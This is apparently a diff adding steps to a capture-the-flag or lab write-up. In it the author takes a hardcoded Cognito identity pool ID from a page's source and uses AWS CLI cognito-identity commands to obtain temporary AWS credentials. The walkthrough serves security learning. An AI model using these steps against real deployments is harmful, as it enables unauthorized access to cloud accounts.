@@ -12,5 +12,55 @@ We are provided with:
 
 <img width="774" height="1055" alt="image" src="https://github.com/user-attachments/assets/dd5598fd-ad46-41e0-bcbb-13f1d496440d" />
 
-
 -----
+
+Firstly we can see `cognito-sync:*` is there. May be we can find something (UserPoolId, ClientId, IdentityPoolId ?) via viewing the source, if they hardcoded it ?
+
+<img width="1939" height="626" alt="image" src="https://github.com/user-attachments/assets/97e8eef1-03ca-498e-8424-220f69e2a4f2" />
+
+> We are right!
+
+> IdentityPoolId: us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b
+
+Searched for `aws cognito` cli command, which can be used with `IdentityPoolId`
+1. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/create-identity-pool.html
+2. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/describe-identity.html
+3. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-credentials-for-identity.html
+4. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/describe-identity-pool.html
+5. https://docs.aws.amazon.com/cli/latest/reference/cognito-identity/get-id.html
+
+- Tried with `describe-identity-pool` as it has the option of passing `--identity-pool-id` :
+```bash
+$ aws cognito-identity describe-identity-pool --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
+```
+
+<img width="2812" height="408" alt="image" src="https://github.com/user-attachments/assets/4314d838-fade-44fd-9c2a-a77830a65cf6" />
+> OOps!!!
+
+- Tried with `get-id` as it has the option of passing `--identity-pool-id` :
+```bash
+$ aws cognito-identity get-id --identity-pool-id "us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
+```
+
+<img width="1937" height="243" alt="image" src="https://github.com/user-attachments/assets/b9c4ab69-0204-463d-a168-5c54a1618ea7" />
+
+> "IdentityId": "us-east-1:157d6171-ee94-c66b-ed32-62dba3aa1b9b"
+
+Now, we can try `describe-identity` as it has the option of passing `--identity-id` :
+```bash
+$ aws cognito-identity describe-identity --identity-id us-east-1:157d6171-ee94-c66b-ed32-62dba3aa1b9b
+```
+
+<img width="2797" height="313" alt="image" src="https://github.com/user-attachments/assets/a27a9dc1-55f9-4d49-8056-d32e8dab8af2" />
+> OOps!!!
+
+Up next to `get-credentials-for-identity` as it also has the option of passing `--identity-id` :
+```bash
+$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:157d6171-ee94-c66b-ed32-62dba3aa1b9b
+```
+
+<img width="2802" height="1185" alt="image" src="https://github.com/user-attachments/assets/2af959ac-1206-48ab-bc1e-52a773a8d816" />
+
+> Worked!
+
+
